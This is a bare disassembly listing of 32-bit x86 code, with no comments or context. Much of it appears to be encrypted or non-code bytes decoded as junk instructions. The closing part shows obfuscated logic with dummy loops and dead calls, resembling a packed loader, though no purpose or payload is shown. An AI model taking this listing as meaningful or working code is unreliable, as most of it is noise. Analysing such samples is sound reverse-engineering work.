  40fb97:	jb     0x40fb8e
  40fb99:	push   ss
  40fb9a:	(bad)  [edx+ebp*1-0x24]
  40fb9e:	enter  0x332e,0x64
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff9e
  40fbc9:	mov    esp,0xb6d001bc
  40fbce:	jle    0x40fc4e
  40fbd0:	jl     0x40fc4f
  40fbd2:	jle    0x40fc52
  40fbd4:	pop    esp
  40fbd5:	fnstcw WORD PTR cs:[esi+0x190a1298]
  40fbdc:	xchg   ebp,eax
  40fbdd:	push   ss
  40fbde:	scas   al,BYTE PTR es:[edi]
  40fbdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbe0:	mov    es,ebx
  40fbe2:	retf   
  40fbe3:	mov    DWORD PTR [ecx+0x56],esp
  40fbe6:	scas   eax,DWORD PTR es:[edi]
  40fbe7:	pushf  
  40fbe8:	dec    ebp
  40fbe9:	pushf  
  40fbea:	inc    DWORD PTR [edx]
  40fbec:	jg     0x40fbc3
  40fbee:	xor    al,0x8a
  40fbf0:	pand   mm5,QWORD PTR [ebp-0x73f94ce2]
  40fbf7:	pushf  
  40fbf8:	call   0xcbd3:0xd27a225d
  40fbff:	(bad)  
  40fc01:	mov    esi,0x3bd8d0bf
  40fc06:	mov    ds:0x89943439,eax
  40fc0b:	inc    edi
  40fc0c:	push   ds
  40fc0d:	icebp  
  40fc0e:	adc    DWORD PTR ds:0xa6a8f55e,ecx
  40fc14:	pop    ebx
  40fc15:	sub    edx,ebx
  40fc17:	pop    es
  40fc18:	mov    edx,0x3637b452
  40fc1d:	sbb    eax,0xfa203818
  40fc22:	imul   esp,eax,0x43b13a33
  40fc28:	je     0x40fbe4
  40fc2a:	mov    bl,0xc3
  40fc2c:	pusha  
  40fc2d:	xor    ebx,0x3d20b8d8
  40fc33:	jmp    0x3aa59d65
  40fc38:	cwde   
  40fc39:	push   es
  40fc3a:	and    al,BYTE PTR [ecx-0xc6ceb0e]
  40fc40:	cmp    al,0xfd
  40fc42:	inc    eax
  40fc43:	sub    ebp,DWORD PTR [ebp-0x4426878f]
  40fc49:	add    BYTE PTR [eax-0x6a],bl
  40fc4c:	mov    dh,0x7c
  40fc4e:	mov    WORD PTR [eax+0x449efae3],fs
  40fc54:	(bad)  
  40fc55:	(bad)  
  40fc56:	mov    eax,ds:0xb8cd7099
  40fc5b:	pop    ecx
  40fc5c:	jbe    0x40fcc0
  40fc5e:	jae    0x40fc1c
  40fc60:	dec    esi
  40fc61:	popa   
  40fc62:	mov    ebx,0x87113ce9
  40fc67:	in     al,dx
  40fc68:	and    BYTE PTR [edx-0x78],bh
  40fc6b:	push   edi
  40fc6c:	es jnp 0x40fc88
  40fc6f:	imul   eax,ebp,0x18
  40fc72:	mov    esp,0xce6a6b86
  40fc77:	out    dx,al
  40fc78:	push   ds
  40fc79:	cmp    al,0x1e
  40fc7b:	mov    bh,0x8a
  40fc7d:	int3   
  40fc7e:	jle    0x40fc2c
  40fc80:	enter  0x2685,0xf9
  40fc84:	mov    eax,DWORD PTR [ebx+eax*4]
  40fc87:	xor    eax,0xed296f31
  40fc8c:	dec    ebp
  40fc8d:	jbe    0x40fca3
  40fc8f:	mov    ebx,0x834fb80e
  40fc94:	push   edx
  40fc95:	sbb    ecx,ecx
  40fc97:	loopne 0x40fd11
  40fc99:	(bad)  
  40fc9a:	xchg   edx,eax
  40fc9b:	xchg   esp,eax
  40fc9c:	mov    ecx,DWORD PTR [edi]
  40fc9e:	inc    edx
  40fc9f:	mov    BYTE PTR [ebx+0x16],dh
  40fca2:	pop    edi
  40fca3:	push   eax
  40fca4:	mov    ebp,0xfa905e41
  40fca9:	mov    al,0xb9
  40fcab:	adc    ch,BYTE PTR [edx+0x52]
  40fcae:	mov    eax,ds:0x254f8ace
  40fcb3:	mov    dh,0xc0
  40fcb5:	cdq    
  40fcb6:	fxch   st(3)
  40fcb8:	nop
  40fcb9:	push   0x6
  40fcbb:	js     0x40fc88
  40fcbd:	test   bl,al
  40fcbf:	repnz xchg ebx,eax
  40fcc1:	fcomp  st(1)
  40fcc3:	dec    eax
  40fcc4:	push   0x66
  40fcc6:	nop
  40fcc7:	rcr    BYTE PTR [edx],cl
  40fcc9:	cmc    
  40fcca:	pop    ecx
  40fccb:	push   0xada1d0c6
  40fcd0:	sbb    ch,bl
  40fcd2:	int    0x16
  40fcd4:	sub    BYTE PTR [ecx-0x56],ch
  40fcd7:	jno    0x34342c13
  40fcdd:	fmul   st,st(3)
  40fcdf:	sbb    BYTE PTR [edi+ebp*1+0x36],ch
  40fce3:	leave  
  40fce4:	shl    BYTE PTR [eax],cl
  40fce6:	fadd   DWORD PTR [ebx]
  40fce8:	(bad)  
  40fce9:	scas   al,BYTE PTR es:[edi]
  40fcea:	xor    DWORD PTR [esi-0x1c],0x6
  40fcee:	jbe    0x40fd5a
  40fcf0:	sbb    bl,BYTE PTR [ebp+0x30]
  40fcf3:	(bad)  
  40fcf4:	lods   eax,DWORD PTR ds:[esi]
  40fcf5:	cmp    eax,0x995498bc
  40fcfa:	add    esp,DWORD PTR [ebp-0x68]
  40fcfd:	cmp    al,0x15
  40fcff:	(bad)  
  40fd00:	div    BYTE PTR [ebx+0x5c]
  40fd03:	xor    BYTE PTR [ebx+edi*8],ah
  40fd06:	mov    ds:0xd495fe16,eax
  40fd0b:	retf   
  40fd0c:	shl    DWORD PTR [eax-0x4e],0xd0
  40fd10:	dec    edi
  40fd11:	mov    al,BYTE PTR [ebx+esi*2]
  40fd14:	in     al,0x8b
  40fd16:	jo     0x40fceb
  40fd18:	retf   0x8bcf
  40fd1b:	out    dx,al
  40fd1c:	int    0x5c
  40fd1e:	jbe    0x40fcfd
  40fd20:	xchg   ebp,eax
  40fd21:	xchg   ecx,eax
  40fd22:	jmp    0x40fcf2
  40fd24:	in     al,0xc0
  40fd26:	lahf   
  40fd27:	or     bl,BYTE PTR [esi+0x7a24e857]
  40fd2d:	sub    al,0x78
  40fd2f:	push   0x4fd22eef
  40fd34:	int    0xd
  40fd36:	sbb    al,0xd6
  40fd38:	jmp    0x5ce4bdf6
  40fd3d:	popa   
  40fd3e:	pop    edi
  40fd3f:	lds    esi,FWORD PTR [ecx]
  40fd41:	ret    0xdf96
  40fd44:	dec    eax
  40fd45:	mov    ebx,0x17a0efd0
  40fd4a:	dec    edx
  40fd4b:	and    eax,0xf6321c22
  40fd50:	inc    esi
  40fd51:	fldcw  WORD PTR [ecx]
  40fd53:	out    0xce,al
  40fd55:	and    edx,DWORD PTR [esi-0x17cda9f3]
  40fd5b:	js     0x40fd4b
  40fd5d:	or     ah,BYTE PTR [ecx+0x8]
  40fd60:	xor    eax,0x829ff252
  40fd65:	and    BYTE PTR [ecx+edi*4-0x2ec5fad5],dl
  40fd6c:	mov    eax,ds:0x693b07c7
  40fd71:	scas   eax,DWORD PTR es:[edi]
  40fd72:	inc    ebp
  40fd73:	ss jle 0x40fdf0
  40fd76:	inc    ebx
  40fd77:	lds    edx,FWORD PTR [edi]
  40fd79:	inc    esp
  40fd7a:	adc    al,0x25
  40fd7c:	retf   0x739
  40fd7f:	jp     0x40fd07
  40fd81:	sbb    DWORD PTR [edx+eiz*1+0x4c],ecx
  40fd85:	out    dx,eax
  40fd86:	xchg   ecx,eax
  40fd87:	scas   al,BYTE PTR es:[edi]
  40fd88:	or     eax,0x42033e4c
  40fd8d:	jmp    DWORD PTR [esi-0x53ab0332]
  40fd93:	sub    DWORD PTR [ebx],ebp
  40fd95:	jecxz  0x40fd66
  40fd97:	ret    
  40fd98:	je     0x40fd3f
  40fd9a:	imul   BYTE PTR [esi+0x74]
  40fd9d:	xchg   ebx,eax
  40fd9e:	pop    ecx
  40fd9f:	adc    al,0x26
  40fda1:	xor    cl,bh
  40fda3:	push   edx
  40fda4:	and    al,0x72
  40fda6:	dec    ebx
  40fda7:	lds    ecx,FWORD PTR [ebx-0x68]
  40fdaa:	fld    DWORD PTR [edi]
  40fdac:	(bad)  
  40fdad:	mov    esp,0x11045d19
  40fdb2:	push   edx
  40fdb3:	or     al,0xdb
  40fdb5:	push   esp
  40fdb6:	in     al,0xa3
  40fdb8:	push   esp
  40fdb9:	std    
  40fdba:	adc    eax,DWORD PTR [eax-0x5a6d85a9]
  40fdc0:	push   cs
  40fdc1:	in     al,0xf2
  40fdc3:	cmp    al,0x59
  40fdc5:	into   
  40fdc6:	test   al,0x9b
  40fdc8:	in     eax,dx
  40fdc9:	adc    eax,0x491a4505
  40fdce:	ret    
  40fdcf:	jmp    0x6d8a:0x72cd64a4
  40fdd6:	mov    bl,0x5c
  40fdd8:	and    DWORD PTR [esi-0x2b8243c5],0x5
  40fddf:	inc    ecx
  40fde0:	rol    DWORD PTR [edx-0x306193cc],cl
  40fde6:	jmp    0xb91f41a7
  40fdeb:	bsf    ebp,DWORD PTR [esi+esi*4-0x48cb9ceb]
  40fdf3:	mov    bl,0xb9
  40fdf5:	adc    edx,DWORD PTR [ecx]
  40fdf7:	xchg   ecx,edx
  40fdf9:	mov    edx,0x3a23484b
  40fdfe:	call   0xc77:0x6916cba2
  40fe05:	mov    ch,0x52
  40fe07:	test   al,0x67
  40fe09:	and    eax,0x4e3f24fe
  40fe0e:	xor    ecx,DWORD PTR [eax]
  40fe10:	nop
  40fe11:	cmp    BYTE PTR [ebx-0x2c],0x67
  40fe15:	pop    edx
  40fe16:	dec    DWORD PTR [ebp-0x10]
  40fe19:	xlat   BYTE PTR ds:[ebx]
  40fe1a:	pop    eax
  40fe1b:	cs icebp 
  40fe1d:	cmp    al,0x7c
  40fe1f:	loope  0x40fe18
  40fe21:	sti    
  40fe22:	cmp    bh,dl
  40fe24:	out    dx,eax
  40fe25:	call   0x2de383b2
  40fe2a:	xchg   ecx,eax
  40fe2b:	or     BYTE PTR [eax+ebx*1],dl
  40fe2e:	jge    0x40fe9c
  40fe30:	sub    BYTE PTR [ebp-0xdca8bea],dl
  40fe36:	ds pop ss
  40fe38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe39:	adc    bl,BYTE PTR [edi-0x3f1dfc69]
  40fe3f:	push   0x52
  40fe41:	js     0x40febe
  40fe43:	mov    edx,ebx
  40fe45:	jns    0x40fdcd
  40fe47:	(bad)  
  40fe48:	cmp    al,0x1f
  40fe4a:	xchg   esp,eax
  40fe4b:	ror    BYTE PTR [ecx+0xa8fe609],1
  40fe51:	cld    
  40fe52:	pop    eax
  40fe53:	xchg   ebx,eax
  40fe54:	pop    es
  40fe55:	mov    cs,WORD PTR [ecx]
  40fe57:	fucomip st,st(1)
  40fe59:	jo     0x40fe45
  40fe5b:	pop    ds
  40fe5c:	cli    
  40fe5d:	sbb    DWORD PTR [esi+0x4e17aee5],esp
  40fe63:	cmp    esp,esi
  40fe65:	dec    ecx
  40fe66:	cli    
  40fe67:	out    dx,eax
  40fe68:	sbb    eax,0xffbf04f9
  40fe6d:	bound  ecx,QWORD PTR ds:0x6428d707
  40fe73:	cmp    BYTE PTR [edx],ah
  40fe75:	mov    eax,0x6f5b2671
  40fe7a:	cmp    eax,0x4666a460
  40fe7f:	loop   0x40fedb
  40fe81:	sbb    DWORD PTR [ebp+0x12dd1f96],0x0
  40fe88:	jnp    0x40fed9
  40fe8a:	dec    esi
  40fe8b:	mov    ?,WORD PTR [ebp-0x638c07e0]
  40fe91:	out    0xfd,al
  40fe93:	mov    ah,0x49
  40fe95:	and    eax,0xe9ec99a
  40fe9a:	mov    esi,0x1e34a48c
  40fe9f:	aam    0xff
  40fea1:	sbb    BYTE PTR [eax],cl
  40fea3:	xor    ch,BYTE PTR [esi]
  40fea5:	popf   
  40fea6:	sbb    cl,BYTE PTR [esp+eiz*4-0x6d]
  40feaa:	ret    
  40feab:	cmp    edx,DWORD PTR [ecx]
  40fead:	adc    eax,0xa3abde5f
  40feb2:	cmp    esi,DWORD PTR [edx]
  40feb4:	mov    eax,ds:0xf0be5fc8
  40feb9:	sub    DWORD PTR [eax-0x6b147920],0xffffffce
  40fec0:	dec    ecx
  40fec1:	js     0x40fe92
  40fec3:	(bad)  
  40fec4:	daa    
  40fec5:	sti    
  40fec6:	das    
  40fec7:	call   0x961aa02c
  40fecc:	xchg   ecx,eax
  40fecd:	popf   
  40fece:	cmc    
  40fecf:	push   ss
  40fed0:	mov    al,0x38
  40fed2:	ret    0x6a17
  40fed5:	dec    ebp
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x15114346
  40fef3:	fst    DWORD PTR [edi+0x7e7eb5de]
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	test   eax,esp
  40feff:	xor    edx,esp
  40ff01:	dec    esp
  40ff02:	and    al,dl
  40ff04:	sbb    bh,BYTE PTR [ebx+0x23220518]
  40ff0a:	aam    0xb2
  40ff0c:	fcomp  QWORD PTR [ecx-0x2f]
  40ff0f:	pop    es
  40ff10:	jae    0x40ff05
  40ff12:	adc    BYTE PTR [edx],dh
  40ff14:	jp     0x40ff58
  40ff16:	xor    al,0xed
  40ff18:	test   al,0xc4
  40ff1a:	daa    
  40ff1b:	or     eax,0x2d29b93e
  40ff20:	cmp    ebp,DWORD PTR [ecx]
  40ff22:	out    0x87,eax
  40ff24:	pop    ebp
  40ff25:	dec    DWORD PTR [esi-0x78e476b0]
  40ff2b:	fwait
  40ff2c:	std    
  40ff2d:	call   FWORD PTR ds:0xe78d5a3b
  40ff33:	xchg   ebx,eax
  40ff34:	popf   
  40ff35:	mov    ch,0x4e
  40ff37:	adc    dl,BYTE PTR [ebp-0x73]
  40ff3a:	(bad)  
  40ff3b:	cmp    esp,ebp
  40ff3d:	neg    DWORD PTR [esi]
  40ff3f:	test   BYTE PTR [edx+0x11],ch
  40ff42:	sbb    al,0xdf
  40ff44:	sbb    al,0xdc
  40ff46:	jbe    0x40ff54
  40ff48:	cmp    BYTE PTR [ecx+0x2f],0x94
  40ff4c:	jmp    0x40ffa4
  40ff4e:	outs   dx,BYTE PTR ds:[esi]
  40ff4f:	mov    edi,0x202e7391
  40ff54:	cmp    al,0x29
  40ff56:	jle    0x40fefc
  40ff58:	add    dl,ah
  40ff5a:	jmp    0x40ff5c
  40ff5c:	fwait
  40ff5d:	ds retf 0x82dd
  40ff61:	mov    edi,ebp
  40ff63:	ins    DWORD PTR es:[edi],dx
  40ff64:	sub    DWORD PTR cs:[ebp-0x7b],0x78334932
  40ff6c:	out    dx,al
  40ff6d:	mov    eax,0x8b99f155
  40ff72:	mov    ds:0x67bff860,eax
  40ff77:	cmp    al,0x13
  40ff79:	xor    DWORD PTR [edi+0x3b],0xffffff93
  40ff7d:	pop    ebp
  40ff7e:	int3   
  40ff7f:	mov    ah,0x12
  40ff81:	sbb    ah,0xfb
  40ff84:	pop    es
  40ff85:	mov    ds:0xd6ffd244,eax
  40ff8a:	bound  eax,QWORD PTR [eax+0x49ea3e17]
  40ff90:	push   0xffffff87
  40ff92:	fistp  WORD PTR [esi+0x51]
  40ff95:	test   BYTE PTR [esi],ch
  40ff97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff98:	mov    DWORD PTR [eax],ecx
  40ff9a:	sbb    eax,0x7d3c5e6f
  40ff9f:	sbb    DWORD PTR [edi+0xe],0xffffffca
  40ffa3:	mov    BYTE PTR [ecx+0x5c],al
  40ffa6:	sahf   
  40ffa7:	ret    
  40ffa8:	fiadd  DWORD PTR [ebx]
  40ffaa:	cmp    BYTE PTR [esp+edi*1+0x4a67ad86],al
  40ffb1:	adc    ebp,DWORD PTR [ebp-0x439b1d78]
  40ffb7:	sub    DWORD PTR [ebp-0x69cee85],ecx
  40ffbd:	aaa    
  40ffbe:	out    0xba,al
  40ffc0:	push   ss
  40ffc1:	push   ss
  40ffc2:	xor    esi,ebx
  40ffc4:	sti    
  40ffc5:	push   ebp
  40ffc6:	adc    al,0xaf
  40ffc8:	sbb    dh,BYTE PTR [esi-0x7c070d6f]
  40ffce:	dec    ecx
  40ffcf:	pop    ebp
  40ffd1:	clc    
  40ffd2:	jmp    0x968fae11
  40ffd7:	clc    
  40ffd8:	jmp    0xf3e0:0x7b48b79e
  40ffdf:	or     eax,0x5d458d3c
  40ffe4:	test   eax,0x3a75da5b
  40ffe9:	pusha  
  40ffea:	mov    edx,0x47c1f9f0
  40ffef:	and    esi,edx
  40fff1:	retf   0x34af
  40fff4:	call   0x8a82984f
  40fff9:	pop    ecx
  40fffa:	daa    
  40fffb:	sbb    dh,BYTE PTR [ecx+0x52]
  40fffe:	push   ebx
  40ffff:	fadd   QWORD PTR [esi+0xb097b1a]
  410005:	inc    ecx
  410006:	inc    BYTE PTR [edi+esi*2+0x3a9a3a3e]
  41000d:	xchg   ebx,eax
  41000e:	fnstenv [eax]
  410010:	retf   
  410011:	inc    esp
  410012:	xacquire xchg DWORD PTR [esi],ecx
  410015:	mov    eax,0x8708ea39
  41001a:	mov    cl,0x9
  41001c:	add    ebx,DWORD PTR [edx]
  41001e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41001f:	inc    ecx
  410020:	out    dx,eax
  410021:	adc    DWORD PTR [esi],ebx
  410023:	inc    ebx
  410024:	push   es
  410025:	into   
  410026:	pop    esp
  410027:	push   ds
  410028:	(bad)  
  410029:	sti    
  41002a:	jne    0x40ffd5
  41002c:	mov    BYTE PTR [eax],bh
  41002e:	test   BYTE PTR [esi+0x6bf9984a],cl
  410034:	and    edx,DWORD PTR ds:0x55bba1c8
  41003a:	mov    cl,0x49
  41003c:	xchg   ebx,eax
  41003d:	ret    0x8e8a
  410040:	push   ecx
  410041:	mov    ch,0xf3
  410043:	sbb    eax,0x4884804f
  410048:	or     esi,DWORD PTR ds:0x769166e0
  41004e:	retf   0x6076
  410051:	sub    cl,BYTE PTR [eax+ebp*1-0x1c]
  410055:	mov    bl,0x74
  410057:	mov    ch,0x9a
  410059:	adc    DWORD PTR [eax-0x3e],esi
  41005c:	fsub   DWORD PTR [ebp-0x19]
  41005f:	popa   
  410060:	xor    eax,0xfcfafe29
  410065:	mov    ds:0xfeded006,eax
  41006a:	setb   cl
  41006d:	sar    BYTE PTR [esp+eax*4],cl
  410070:	test   ch,0xcb
  410073:	jmp    0x713904ef
  410078:	loope  0x4100b9
  41007a:	mov    ecx,ds
  41007c:	xchg   edx,eax
  41007d:	sub    ecx,esi
  41007f:	adc    al,0xaa
  410081:	sahf   
  410082:	arpl   WORD PTR [ecx],si
  410084:	je     0x4100ca
  410086:	icebp  
  410087:	popf   
  410088:	lds    edi,FWORD PTR [edx+0x15]
  41008b:	out    dx,eax
  41008c:	dec    ecx
  41008d:	or     dh,BYTE PTR [ecx+0x24e5480f]
  410093:	xchg   DWORD PTR [edx],esp
  410095:	call   0x7c84:0x4775607a
  41009c:	push   edx
  41009d:	ror    bh,0x12
  4100a0:	lds    esp,FWORD PTR [ebx-0x5e55d01b]
  4100a6:	jle    0x4100d7
  4100a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100a9:	std    
  4100aa:	sti    
  4100ab:	aam    0xab
  4100ad:	ins    DWORD PTR es:[di],dx
  4100af:	imul   ecx,esp,0xffffff85
  4100b2:	ret    0x45f7
  4100b5:	jnp    0x410051
  4100b7:	pop    es
  4100b8:	fiadd  WORD PTR [ebx+0x26976a05]
  4100be:	mov    ?,WORD PTR [esi-0x19]
  4100c1:	dec    eax
  4100c2:	gs mov edi,0x53b531ea
  4100c8:	out    0x31,eax
  4100ca:	or     ecx,edi
  4100cc:	mov    ds:0xcb835205,al
  4100d1:	jbe    0x4100f2
  4100d3:	rcr    BYTE PTR cs:[edx+0x160ded6f],1
  4100da:	icebp  
  4100db:	jp     0x4100f0
  4100dd:	(bad)  
  4100de:	lods   eax,DWORD PTR ds:[esi]
  4100df:	cld    
  4100e0:	out    dx,eax
  4100e1:	leave  
  4100e2:	jo     0x41015f
  4100e4:	in     al,0x9a
  4100e6:	mov    eax,0xb835a320
  4100eb:	mov    dh,0x63
  4100ed:	cmc    
  4100ee:	jmp    0x4d1369e8
  4100f3:	imul   edx,esi,0x24
  4100f6:	sub    DWORD PTR [esi-0x2cbf21e3],esp
  4100fc:	rol    DWORD PTR [edx+0x5a624443],1
  410102:	jns    0x4100e2
  410104:	mov    eax,0x5151c531
  410109:	pop    edi
  41010a:	mov    DWORD PTR [edi-0xf],eax
  41010d:	pop    esp
  41010e:	or     BYTE PTR [esi+0x7129a6b4],0xa3
  410115:	fwait
  410116:	jmp    0x8559:0x32d3c097
  41011d:	adc    BYTE PTR [ebx-0x49aab217],bl
  410123:	lods   eax,DWORD PTR ds:[esi]
  410124:	xor    ebx,DWORD PTR [esi+0x77f51e14]
  41012a:	add    ebp,DWORD PTR [edx+ebx*2-0x7d]
  41012e:	lods   al,BYTE PTR ds:[esi]
  41012f:	xchg   edx,eax
  410130:	and    BYTE PTR [ebx],bh
  410132:	push   es
  410133:	ds pop eax
  410135:	push   esp
  410136:	dec    ebx
  410138:	dec    ebp
  410139:	xor    DWORD PTR [eax+eax*2],ecx
  41013c:	jecxz  0x410139
  41013e:	add    eax,0xaa7c1b8f
  410143:	inc    esi
  410144:	iret   
  410145:	mov    ch,BYTE PTR ss:[ebx-0x2b]
  410149:	stc    
  41014a:	jae    0x4100d3
  41014c:	retf   0x1f2
  41014f:	sub    dl,BYTE PTR fs:[eax]
  410152:	sub    BYTE PTR [eax-0x6a],ah
  410155:	jge    0x18666279
  41015b:	int3   
  41015c:	test   dh,0xf5
  41015f:	leave  
  410160:	jl     0x4101bb
  410162:	out    0x75,eax
  410164:	in     eax,dx
  410165:	push   es
  410166:	pop    eax
  410167:	mov    WORD PTR [eax+0x24e7f206],?
  41016d:	and    al,0x7b
  41016f:	(bad)  
  410170:	sbb    dh,ah
  410172:	or     al,bl
  410174:	retf   
  410175:	jb     0x4101a8
  410177:	mov    ebp,0x4ce44f46
  41017c:	sbb    BYTE PTR [esi],dl
  41017e:	addr16 mov edi,0x82463601
  410184:	mov    ebx,0x95f592c7
  410189:	lahf   
  41018a:	dec    edi
  41018b:	(bad)
  41018e:	ins    BYTE PTR es:[edi],dx
  41018f:	call   0x7239c11d
  410194:	aaa    
  410195:	xchg   esp,eax
  410196:	lods   eax,DWORD PTR es:[esi]
  410198:	push   0xe5208dbc
  41019d:	mov    ah,bl
  41019f:	jbe    0x41014e
  4101a1:	push   ebp
  4101a2:	in     al,dx
  4101a3:	jmp    0x4101fa
  4101a5:	leave  
  4101a6:	cs mov ch,0xe6
  4101a9:	cmp    ebx,DWORD PTR [edx-0x145d35ef]
  4101af:	mov    eax,0xb6e731dc
  4101b4:	xchg   ebx,eax
  4101b5:	cmp    esi,DWORD PTR [ebx]
  4101b7:	xchg   ebx,eax
  4101b8:	pop    ecx
  4101b9:	pop    ss
  4101ba:	push   ebx
  4101bb:	inc    ebx
  4101bc:	out    dx,al
  4101bd:	inc    esp
  4101be:	xchg   DWORD PTR [eax],eax
  4101c0:	(bad)  
  4101c1:	dec    edi
  4101c2:	dec    ecx
  4101c3:	push   0x187c429c
  4101c8:	gs cmp eax,0x6005e785
  4101ce:	mov    DWORD PTR [ebp-0x47],esp
  4101d1:	push   esi
  4101d2:	xor    ecx,DWORD PTR [eax-0x3c8f7f4a]
  4101d8:	xor    DWORD PTR [eax],edi
  4101da:	xor    edx,DWORD PTR [ebx]
  4101dc:	inc    edx
  4101dd:	xchg   ecx,eax
  4101de:	shr    DWORD PTR [ebx-0x6f],1
  4101e1:	cwde   
  4101e2:	sub    al,0x11
  4101e4:	jno    0x4101d9
  4101e6:	pop    esi
  4101e7:	ret    0x843d
  4101ea:	push   cs
  4101eb:	mov    ds:0x660b981b,al
  4101f0:	jne    0x41024f
  4101f2:	inc    ebp
  4101f3:	mul    dl
  4101f5:	leave  
  4101f6:	dec    ax
  4101f8:	sbb    ecx,DWORD PTR gs:[ebp+0x25]
  4101fc:	aad    0xbd
  4101fe:	icebp  
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
